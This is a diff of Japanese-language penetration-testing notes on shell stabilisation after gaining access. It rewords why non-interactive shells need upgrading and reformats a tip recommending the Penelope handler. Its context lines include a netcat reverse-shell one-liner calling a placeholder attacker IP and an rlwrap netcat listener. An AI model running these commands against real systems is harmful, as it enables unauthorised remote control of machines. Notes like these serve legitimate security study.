@@ -226,10 +226,10 @@ nc -e cmd.exe <attacker_IP> <Port>
 
 # シェルの安定化
 
-## シェル安定化の背景と目的
+## シェル安定化の必要性
 
-- 攻撃によって得られたシェルは、機能が制限された不完全な非インタラクティブ）シェルであることが多い
-- より安定した、使いやすいシェル（インタラクティブシェル）に昇格させる
+- 攻撃によって得られたシェルは、機能が制限された非インタラクティブシェルであることが多く、接続が切れたり、対話式のコマンドが実行できなかったりと、使いづらい
+- より安定したインタラクティブシェルに昇格させることで、内部探索を容易にする
 
 ## リスナーの立て方
 
@@ -240,8 +240,10 @@ sudo rlwrap nc -lvnp <Port>
 - `rlwrap`は入力補完や履歴機能などの*readline機能*を付与
 - 普通の`nc`より遥かに快適なので、常に使うこと
 
-💡ただし、🐧Unix系の場合は、[Penelope - GitHub](https://github.com/brightio/penelope)を使ったほうが非常に安定
-	Ctrl + Cなどの便利機能が標準で使える
+
+> [!TIP]
+> Unix系の場合は、[Penelope - GitHub](https://github.com/brightio/penelope)を使ったほうが非常に安定しており、Ctrl + Cなどの便利機能も標準で使える。
+
 ```zsh
 # ダウンロードURL
 https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py
